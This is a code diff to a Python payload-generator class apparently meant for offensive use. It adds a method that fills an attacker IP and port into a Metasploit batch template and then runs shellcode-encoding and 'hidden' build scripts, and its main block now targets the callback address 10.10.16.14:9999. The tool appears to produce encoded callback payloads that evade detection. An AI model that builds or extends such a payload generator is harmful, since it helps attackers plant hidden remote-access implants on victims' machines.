@@ -66,8 +66,11 @@ class mypayloadgen():
 
         self.__exe_payloadname = "myclient.exe"
 
+        self.__msf_templete = "msf.bat"
+        self.__msf_ip_tag = r"%%IP%%"
+        self.__msf_port_tag = r"%%PORT%%"
 
-        self.__mystd = subprocess.DEVNULL
+        self.__mystd = None
 
     def debug_mode(self,inbool):
         if inbool:
@@ -294,11 +297,26 @@ class mypayloadgen():
         with open(os.path.join(self.__parentdir,self.__toCS,self.__filenameCS),mode='w') as f:
             f.write(all_of_it)
 
+    def gen_msf(self,host,port):
+        mycwd = os.path.join(self.__parentdir,self.__to_client)
+
+        #config
+        with open(os.path.join(self.__parentdir,self.__to_template,self.__msf_templete),mode='r') as f:
+            all_of_it = f.read()
+        
+        with open(os.path.join(self.__parentdir,self.__to_client,self.__msf_templete),mode='w') as f:
+            f.write(all_of_it.replace(self.__msf_ip_tag,host).replace(self.__msf_port_tag, str(port)))
+        
+        subprocess.run(["msf.bat"], shell=True, cwd=mycwd, stdout=self.__mystd)
+        subprocess.run(["conf-shellcode-encoder.bat"], shell=True, cwd=mycwd, stdout=self.__mystd)
+        subprocess.run(["shellcode-encoder.bat"], shell=True, cwd=mycwd, stdout=self.__mystd)
+        subprocess.run(["conf-hidden-test.bat"], shell=True, cwd=mycwd, stdout=self.__mystd)
+        subprocess.run(["hidden-test.bat"], shell=True, cwd=mycwd, stdout=self.__mystd)
 
 
 if __name__ == "__main__":
     t_mypayloadgen = mypayloadgen()
     #t_mypayloadgen.set_config("socket",False,"127.0.0.1",4444)
-    t_mypayloadgen.gen_inject()
+    t_mypayloadgen.gen_msf("10.10.16.14",9999)
 
 
